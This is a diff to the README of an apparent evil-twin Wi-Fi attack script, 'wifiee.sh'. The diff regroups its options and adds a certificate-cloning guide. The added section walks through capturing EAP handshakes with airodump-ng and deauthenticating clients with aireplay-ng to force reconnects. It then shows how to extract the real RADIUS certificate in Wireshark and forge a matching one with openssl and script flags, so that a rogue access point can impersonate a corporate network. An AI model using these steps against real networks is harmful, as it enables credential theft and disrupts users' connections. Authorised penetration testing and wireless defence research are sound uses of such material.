@@ -79,19 +79,112 @@ sudo ./wifiee.sh --ssid "CorpWiFi" --cert-cn "radius.corp.com" --cert-org "Acme 
 ### All options
 
 ```
-Options:
+Target:
   --ssid NAME           Target SSID (prompted if omitted)
   --bssid MAC           Target BSSID (auto-scanned if omitted)
   --channel N           Channel (auto-detected if omitted)
+
+Interfaces:
   --iface-ap IFACE      Rogue AP interface (default: wlan0)
   --iface-relay IFACE   Relay interface (default: wlan1)
   --country CC          Regulatory domain (default: US)
-  --cert-cn CN          Fake RADIUS cert CN
-  --cert-org ORG        Fake RADIUS cert Org
+
+Certificate:
+  --cert-cn CN          Common Name (FQDN of RADIUS server)
+  --cert-org ORG        Organisation name
+  --cert-ou OU          Organisational Unit
+  --cert-state ST       State/Province
+  --cert-city CITY      City/Locality
+  --cert-file PATH      Use an existing certificate (.crt/.pem)
+  --cert-key PATH       Use an existing private key (.key)
+  --cert-capture        Capture-only mode — grab EAP handshake, then exit
+
+Deauth:
   --deauth N            Deauth burst count (default: 10)
   --no-deauth           Skip deauth phase
+
   -h, --help            Show help
 ```
+
+## Certificate cloning
+
+A convincing rogue AP needs a certificate that looks like the real RADIUS server's. There are three ways to get it right.
+
+### Method 1: Auto-probe (default)
+
+The script automatically tries to connect to the real AP and extract the certificate subject. If it works, you'll see the extracted subject and can use it directly.
+
+### Method 2: Capture & extract with Wireshark
+
+If auto-probe fails (common when you're not in range yet, or the AP ignores your probe), capture the EAP handshake manually:
+
+**Step 1 — Capture the handshake:**
+
+```bash
+# Option A: Use wifiee's built-in capture mode
+sudo ./wifiee.sh --ssid "CorpWiFi" --cert-capture
+
+# Option B: Manual capture with airmon-ng
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon --bssid <BSSID> -c <CHANNEL> -w handshake
+# Wait for a client to authenticate, or deauth one:
+sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
+# Stop when you see EAP frames
+sudo airmon-ng stop wlan0mon
+```
+
+**Step 2 — Extract the certificate in Wireshark:**
+
+```bash
+wireshark handshake.pcap    # or handshake-01.cap from airodump
+```
+
+Apply this display filter:
+
+```
+wlan.bssid==<BSSID> && eap && tls.handshake.certificate
+```
+
+In the packet details pane:
+1. Expand **Extensible Authentication Protocol**
+2. Expand **Transport Layer Security** → **Handshake Protocol: Certificate**
+3. Expand **Certificates** → select the first certificate (the server cert)
+4. Right-click → **Export Bytes** → save as `server.der`
+
+**Step 3 — Read the certificate details:**
+
+```bash
+openssl x509 -inform DER -in server.der -noout -subject -issuer
+
+# Example output:
+# subject=C=AU, ST=Queensland, L=Brisbane, O=Acme Corp, OU=IT, CN=radius.acme.com
+# issuer=C=AU, ST=Queensland, O=Acme Corp, CN=Acme Corp CA
+```
+
+**Step 4 — Create a matching rogue certificate:**
+
+```bash
+# Option A: Pass the fields as flags
+sudo ./wifiee.sh --ssid "CorpWiFi" \
+  --cert-cn "radius.acme.com" \
+  --cert-org "Acme Corp" \
+  --cert-ou "IT" \
+  --cert-state "Queensland" \
+  --cert-city "Brisbane" \
+  --country AU
+
+# Option B: Convert and import the real cert (if you have the key)
+openssl x509 -inform DER -in server.der -out server.crt
+sudo ./wifiee.sh --ssid "CorpWiFi" --cert-file server.crt --cert-key server.key
+
+# Option C: Interactive — the script will prompt you for each field
+sudo ./wifiee.sh --ssid "CorpWiFi"
+# Select "Build custom certificate" when prompted
+```
+
+### Method 3: Interactive builder
+
+If you run the script without cert flags and auto-probe fails, you'll be prompted to build a custom certificate interactively — entering Country, State, City, Organisation, OU, CN, key size, and validity. This is the easiest path when you already know what the real cert looks like.
 
 ## Attack flow
 
